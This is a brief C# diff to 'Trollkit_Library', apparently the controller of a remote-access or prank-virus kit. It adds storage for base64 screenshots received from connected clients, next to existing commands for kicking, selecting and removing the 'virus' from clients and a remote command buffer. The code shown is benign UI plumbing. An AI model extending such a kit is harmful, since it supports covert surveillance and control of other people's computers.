@@ -37,15 +37,21 @@ namespace Trollkit_Library.ClientModules
 
         public ICommand Kick { get { return new SendServerCommand(KickClient); } }
         public ICommand Select { get { return new SendServerCommand(SelectClient); } }
-
 		public ICommand RemoveVirus { get { return new SendServerCommand(RemoveVirusFromClient); } }
 
 		public string CMDBuffer { get; set; }
+		public string ScreenshotString { get; set; }
 
 		public void AddToCMDBuffer(string data)
 		{
 			CMDBuffer += data + "\r\n";
 			NotifyPropertyChanged("CMDBuffer");
+		}
+
+		public void SetScreenshot(string base64Image)
+		{
+			ScreenshotString = base64Image;
+			NotifyPropertyChanged("ScreenshotString");
 		}
 
 		private void RemoveVirusFromClient()
